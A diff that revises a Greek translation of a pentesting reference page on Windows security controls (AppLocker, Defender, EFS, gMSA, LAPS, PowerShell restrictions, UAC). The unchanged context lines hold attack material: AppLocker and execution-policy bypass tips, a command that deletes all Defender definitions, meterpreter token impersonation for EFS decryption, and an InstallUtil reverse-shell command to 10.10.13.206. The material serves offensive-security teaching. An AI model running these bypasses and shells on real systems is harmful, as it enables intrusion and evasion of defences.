@@ -7,11 +7,11 @@
 Μια λίστα λευκών εφαρμογών είναι μια λίστα εγκεκριμένων λογισμικών εφαρμογών ή εκτελέσιμων που επιτρέπεται να είναι παρόντα και να εκτελούνται σε ένα σύστημα. Ο στόχος είναι να προστατευθεί το περιβάλλον από κακόβουλο λογισμικό και μη εγκεκριμένο λογισμικό που δεν ευθυγραμμίζεται με τις συγκεκριμένες επιχειρηματικές ανάγκες ενός οργανισμού.
 
 [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) είναι η **λύση λευκής λίστας εφαρμογών** της Microsoft και δίνει στους διαχειριστές συστημάτων έλεγχο πάνω σε **ποια εφαρμογές και αρχεία μπορούν να εκτελούν οι χρήστες**. Παρέχει **λεπτομερή έλεγχο** πάνω σε εκτελέσιμα, σενάρια, αρχεία εγκατάστασης Windows, DLLs, πακέτα εφαρμογών και εγκαταστάτες πακέτων εφαρμογών.\
-Είναι κοινό για τους οργανισμούς να **μπλοκάρουν το cmd.exe και το PowerShell.exe** και την εγγραφή σε ορισμένους καταλόγους, **αλλά αυτό μπορεί να παρακαμφθεί**.
+Είναι κοινό για τους οργανισμούς να **μπλοκάρουν το cmd.exe και το PowerShell.exe** και την εγγραφή πρόσβασης σε ορισμένους καταλόγους, **αλλά όλα αυτά μπορούν να παρακαμφθούν**.
 
 ### Check
 
-Έλεγχος ποια αρχεία/επέκταση είναι στη μαύρη/λευκή λίστα:
+Έλεγχος ποια αρχεία/επεκτάσεις είναι στη μαύρη/λευκή λίστα:
 ```bash
 Get-ApplockerPolicy -Effective -xml
 
@@ -35,14 +35,14 @@ C:\windows\tracing
 ```
 - Συνήθως **έμπιστοι** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικοί κωδικοί μπορεί να είναι χρήσιμοι για να παρακαμφθεί το AppLocker.
 - **Κακώς γραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
-- Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με το όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
+- Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
 - Οι οργανισμοί συχνά επικεντρώνονται στο **να μπλοκάρουν το `%System32%\WindowsPowerShell\v1.0\powershell.exe` εκτελέσιμο**, αλλά ξεχνούν τις **άλλες** [**τοποθεσίες εκτελέσιμων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
 - **Η επιβολή DLL σπάνια είναι ενεργοποιημένη** λόγω του επιπλέον φορτίου που μπορεί να επιφέρει σε ένα σύστημα, και της ποσότητας δοκιμών που απαιτούνται για να διασφαλιστεί ότι τίποτα δεν θα σπάσει. Έτσι, η χρήση **DLLs ως πίσω πόρτες θα βοηθήσει στην παράκαμψη του AppLocker**.
 - Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε το AppLocker. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Αποθήκευση Διαπιστευτηρίων
 
-### Διαχειριστής Λογαριασμών Ασφαλείας (SAM)
+### Διαχειριστής Ασφαλείας Λογαριασμών (SAM)
 
 Τα τοπικά διαπιστευτήρια είναι παρόντα σε αυτό το αρχείο, οι κωδικοί πρόσβασης είναι κατακερματισμένοι.
 
@@ -69,7 +69,7 @@ C:\windows\tracing
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που είναι διαθέσιμο σε Windows 10 και Windows 11, και σε εκδόσεις Windows Server. **Μπλοκάρει** κοινά εργαλεία pentesting όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για να **παρακαμφθούν αυτές οι προστασίες**.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) είναι ένα Antivirus που είναι διαθέσιμο στα Windows 10 και Windows 11, και σε εκδόσεις των Windows Server. **Μπλοκάρει** κοινά εργαλεία pentesting όπως το **`WinPEAS`**. Ωστόσο, υπάρχουν τρόποι για να **παρακαμφθούν αυτές οι προστασίες**.
 
 ### Έλεγχος
 
@@ -101,13 +101,13 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
-## Encrypted File System (EFS)
+## Εγγεγραμμένο Σύστημα Αρχείων (EFS)
 
-EFS ασφαλίζει αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** γνωστό ως το **Κλειδί Κρυπτογράφησης Αρχείου (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται μέσα στο $EFS **εναλλακτικό ρεύμα δεδομένων** του κρυπτογραφημένου αρχείου. Όταν απαιτείται αποκρυπτογράφηση, χρησιμοποιείται το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη για να αποκρυπτογραφηθεί το FEK από το ρεύμα $EFS. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).
+Το EFS ασφαλίζει τα αρχεία μέσω κρυπτογράφησης, χρησιμοποιώντας ένα **συμμετρικό κλειδί** γνωστό ως **Κλειδί Κρυπτογράφησης Αρχείου (FEK)**. Αυτό το κλειδί κρυπτογραφείται με το **δημόσιο κλειδί** του χρήστη και αποθηκεύεται μέσα στο $EFS **εναλλακτικό ρεύμα δεδομένων** του κρυπτογραφημένου αρχείου. Όταν απαιτείται αποκρυπτογράφηση, χρησιμοποιείται το αντίστοιχο **ιδιωτικό κλειδί** του ψηφιακού πιστοποιητικού του χρήστη για να αποκρυπτογραφηθεί το FEK από το ρεύμα $EFS. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [εδώ](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
 **Σενάρια αποκρυπτογράφησης χωρίς πρωτοβουλία του χρήστη** περιλαμβάνουν:
 
-- Όταν αρχεία ή φάκελοι μεταφέρονται σε ένα μη EFS σύστημα αρχείων, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
+- Όταν αρχεία ή φάκελοι μετακινούνται σε ένα μη EFS σύστημα αρχείων, όπως το [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), αποκρυπτογραφούνται αυτόματα.
 - Κρυπτογραφημένα αρχεία που αποστέλλονται μέσω του δικτύου μέσω του πρωτοκόλλου SMB/CIFS αποκρυπτογραφούνται πριν από τη μετάδοση.
 
 Αυτή η μέθοδος κρυπτογράφησης επιτρέπει **διαφανή πρόσβαση** σε κρυπτογραφημένα αρχεία για τον κάτοχο. Ωστόσο, απλώς αλλάζοντας τον κωδικό πρόσβασης του κατόχου και συνδεόμενος δεν επιτρέπει την αποκρυπτογράφηση.
@@ -119,36 +119,36 @@ EFS ασφαλίζει αρχεία μέσω κρυπτογράφησης, χρ�
 - Αυτόματη αποκρυπτογράφηση συμβαίνει υπό συγκεκριμένες συνθήκες, όπως η αντιγραφή σε FAT32 ή η μετάδοση μέσω δικτύου.
 - Τα κρυπτογραφημένα αρχεία είναι προσβάσιμα στον κάτοχο χωρίς επιπλέον βήματα.
 
-### Check EFS info
+### Έλεγχος πληροφοριών EFS
 
 Ελέγξτε αν ένας **χρήστης** έχει **χρησιμοποιήσει** αυτή την **υπηρεσία** ελέγχοντας αν υπάρχει αυτή η διαδρομή: `C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
 Ελέγξτε **ποιος** έχει **πρόσβαση** στο αρχείο χρησιμοποιώντας cipher /c \<file>\
-Μπορείτε επίσης να χρησιμοποιήσετε `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και **αποκρυπτογραφήσετε** όλα τα αρχεία
+Μπορείτε επίσης να χρησιμοποιήσετε `cipher /e` και `cipher /d` μέσα σε έναν φάκελο για να **κρυπτογραφήσετε** και να **αποκρυπτογραφήσετε** όλα τα αρχεία
 
-### Decrypting EFS files
+### Αποκρυπτογράφηση αρχείων EFS
 
-#### Being Authority System
+#### Όντας Αρχή Συστήματος
 
 Αυτή η μέθοδος απαιτεί ο **θύμα χρήστης** να είναι **σε εκτέλεση** μια **διαδικασία** μέσα στον υπολογιστή. Αν αυτό ισχύει, χρησιμοποιώντας μια συνεδρία `meterpreter` μπορείτε να προσποιηθείτε το διακριτικό της διαδικασίας του χρήστη (`impersonate_token` από `incognito`). Ή μπορείτε απλώς να `migrate` στη διαδικασία του χρήστη.
 
-#### Knowing the users password
+#### Γνωρίζοντας τον κωδικό πρόσβασης του χρήστη
 
 {{#ref}}
 https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 {{#endref}}
 
-## Group Managed Service Accounts (gMSA)
+## Ομαδικοί Διαχειριζόμενοι Λογαριασμοί Υπηρεσιών (gMSA)
 
-Η Microsoft ανέπτυξε τους **Group Managed Service Accounts (gMSA)** για να απλοποιήσει τη διαχείριση των λογαριασμών υπηρεσιών στις υποδομές IT. Σε αντίθεση με τους παραδοσιακούς λογαριασμούς υπηρεσιών που συχνά έχουν ενεργοποιημένη την ρύθμιση "**Ο κωδικός πρόσβασης δεν λήγει ποτέ**", οι gMSA προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:
+Η Microsoft ανέπτυξε τους **Ομαδικούς Διαχειριζόμενους Λογαριασμούς Υπηρεσιών (gMSA)** για να απλοποιήσει τη διαχείριση των λογαριασμών υπηρεσιών στις υποδομές IT. Σε αντίθεση με τους παραδοσιακούς λογαριασμούς υπηρεσιών που συχνά έχουν ενεργοποιημένη την ρύθμιση "**Ο κωδικός πρόσβασης δεν λήγει ποτέ**", οι gMSA προσφέρουν μια πιο ασφαλή και διαχειρίσιμη λύση:
 
-- **Αυτόματη Διαχείριση Κωδικών Πρόσβασης**: Οι gMSA χρησιμοποιούν έναν πολύπλοκο, 240-χαρακτήρων κωδικό πρόσβασης που αλλάζει αυτόματα σύμφωνα με την πολιτική τομέα ή υπολογιστή. Αυτή η διαδικασία διαχειρίζεται από την Υπηρεσία Κατανομής Κλειδιών της Microsoft (KDC), εξαλείφοντας την ανάγκη για χειροκίνητες ενημερώσεις κωδικών πρόσβασης.
+- **Αυτόματη Διαχείριση Κωδικών Πρόσβασης**: Οι gMSA χρησιμοποιούν έναν πολύπλοκο, 240-χαρακτήρων κωδικό πρόσβασης που αλλάζει αυτόματα σύμφωνα με την πολιτική του τομέα ή του υπολογιστή. Αυτή η διαδικασία διαχειρίζεται από την Υπηρεσία Κατανομής Κλειδιών της Microsoft (KDC), εξαλείφοντας την ανάγκη για χειροκίνητες ενημερώσεις κωδικών πρόσβασης.
 - **Ενισχυμένη Ασφάλεια**: Αυτοί οι λογαριασμοί είναι ανθεκτικοί σε κλειδώματα και δεν μπορούν να χρησιμοποιηθούν για διαδραστικές συνδέσεις, ενισχύοντας την ασφάλειά τους.
 - **Υποστήριξη Πολλών Υπολογιστών**: Οι gMSA μπορούν να μοιράζονται σε πολλούς υπολογιστές, καθιστώντας τους ιδανικούς για υπηρεσίες που εκτελούνται σε πολλούς διακομιστές.
 - **Δυνατότητα Προγραμματισμένων Εργασιών**: Σε αντίθεση με τους διαχειριζόμενους λογαριασμούς υπηρεσιών, οι gMSA υποστηρίζουν την εκτέλεση προγραμματισμένων εργασιών.
-- **Απλοποιημένη Διαχείριση SPN**: Το σύστημα ενημερώνει αυτόματα το Όνομα Υπηρεσίας (SPN) όταν υπάρχουν αλλαγές στα στοιχεία sAMaccount του υπολογιστή ή στο DNS όνομα, απλοποιώντας τη διαχείριση SPN.
+- **Απλοποιημένη Διαχείριση SPN**: Το σύστημα ενημερώνει αυτόματα το Όνομα Κύριας Υπηρεσίας (SPN) όταν υπάρχουν αλλαγές στα στοιχεία sAMaccount του υπολογιστή ή στο DNS όνομα, απλοποιώντας τη διαχείριση SPN.
 
-Οι κωδικοί πρόσβασης για τις gMSA αποθηκεύονται στην ιδιότητα LDAP _**msDS-ManagedPassword**_ και επαναρυθμίζονται αυτόματα κάθε 30 ημέρες από τους Domain Controllers (DCs). Αυτός ο κωδικός πρόσβασης, ένα κρυπτογραφημένο blob δεδομένων γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους διαχειριστές και τους διακομιστές στους οποίους είναι εγκατεστημένες οι gMSA, εξασφαλίζοντας ένα ασφαλές περιβάλλον. Για να αποκτήσετε πρόσβαση σε αυτές τις πληροφορίες, απαιτείται μια ασφαλής σύνδεση όπως το LDAPS ή η σύνδεση πρέπει να είναι αυθεντικοποιημένη με 'Sealing & Secure'.
+Οι κωδικοί πρόσβασης για τους gMSA αποθηκεύονται στην ιδιότητα LDAP _**msDS-ManagedPassword**_ και επαναρυθμίζονται αυτόματα κάθε 30 ημέρες από τους Ελεγκτές Τομέα (DCs). Αυτός ο κωδικός πρόσβασης, ένα κρυπτογραφημένο blob δεδομένων γνωστό ως [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), μπορεί να ανακτηθεί μόνο από εξουσιοδοτημένους διαχειριστές και τους διακομιστές στους οποίους είναι εγκατεστημένοι οι gMSA, εξασφαλίζοντας ένα ασφαλές περιβάλλον. Για να αποκτήσετε πρόσβαση σε αυτές τις πληροφορίες, απαιτείται μια ασφαλής σύνδεση όπως το LDAPS ή η σύνδεση πρέπει να είναι αυθεντικοποιημένη με 'Sealing & Secure'.
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)
 
@@ -162,7 +162,7 @@ https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 
 ## LAPS
 
-Η **Λύση Κωδικού Πρόσβασης Τοπικού Διαχειριστή (LAPS)**, διαθέσιμη για λήψη από [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών πρόσβασης τοπικών διαχειριστών. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **τακτικά αλλάζουν**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς πρόσβασης περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με επαρκείς άδειες, παρέχεται η δυνατότητα ανάγνωσης των κωδικών πρόσβασης τοπικών διαχειριστών.
+Η **Λύση Κωδικού Πρόσβασης Τοπικού Διαχειριστή (LAPS)**, διαθέσιμη για λήψη από [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), επιτρέπει τη διαχείριση των κωδικών πρόσβασης τοπικών Διαχειριστών. Αυτοί οι κωδικοί πρόσβασης, οι οποίοι είναι **τυχαίοι**, μοναδικοί και **τακτικά αλλάζουν**, αποθηκεύονται κεντρικά στο Active Directory. Η πρόσβαση σε αυτούς τους κωδικούς πρόσβασης περιορίζεται μέσω ACLs σε εξουσιοδοτημένους χρήστες. Με επαρκείς άδειες, παρέχεται η δυνατότητα ανάγνωσης των κωδικών πρόσβασης τοπικών διαχειριστών.
 
 {{#ref}}
 active-directory-methodology/laps.md
@@ -170,7 +170,7 @@ active-directory-methodology/laps.md
 
 ## PS Constrained Language Mode
 
-Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **κλειδώνει πολλές από τις δυνατότητες** που απαιτούνται για τη χρήση του PowerShell αποτελεσματικά, όπως το μπλοκάρισμα COM αντικειμένων, επιτρέποντας μόνο εγκεκριμένους τύπους .NET, ροές εργασίας βασισμένες σε XAML, κλάσεις PowerShell και άλλα.
+Το PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **κλειδώνει πολλές από τις δυνατότητες** που απαιτούνται για τη χρήση του PowerShell αποτελεσματικά, όπως η μπλοκάρισμα αντικειμένων COM, η επιτρεπόμενη μόνο χρήση εγκεκριμένων τύπων .NET, ροές εργασίας βασισμένες σε XAML, κλάσεις PowerShell και άλλα.
 
 ### **Έλεγχος**
 ```bash
@@ -193,11 +193,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε τη περιορισμένη λειτουργία. Για περισσότερες πληροφορίες, ελέγξτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε τη περιορισμένη λειτουργία. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Πολιτική Εκτέλεσης PS
 
-Από προεπιλογή είναι ρυθμισμένη σε **restricted.** Οι κύριοι τρόποι για να παρακάμψετε αυτήν την πολιτική:
+Από προεπιλογή είναι ρυθμισμένη σε **restricted.** Κύριοι τρόποι για να παρακάμψετε αυτή την πολιτική:
 ```bash
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -231,7 +231,7 @@ More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershel
 - %windir%\Windows\System32\kerberos.dll
 - **NTLMv1** και **NTLMv2**: Λόγοι συμβατότητας
 - %windir%\Windows\System32\msv1_0.dll
-- **Digest**: Web servers και LDAP, κωδικός πρόσβασης σε μορφή MD5 hash
+- **Digest**: Web servers και LDAP, κωδικός πρόσβασης με τη μορφή MD5 hash
 - %windir%\Windows\System32\Wdigest.dll
 - **Schannel**: SSL και TLS
 - %windir%\Windows\System32\Schannel.dll
@@ -242,10 +242,10 @@ More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershel
 
 ## UAC - User Account Control
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί ένα **prompt συγκατάθεσης για ανυψωμένες δραστηριότητες**.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια δυνατότητα που ενεργοποιεί μια **προτροπή συγκατάθεσης για ανυψωμένες δραστηριότητες**.
 
 {{#ref}}
-windows-security-controls/uac-user-account-control.md
+authentication-credentials-uac-and-efs/uac-user-account-control.md
 {{#endref}}
 
 {{#include ../banners/hacktricks-training.md}}
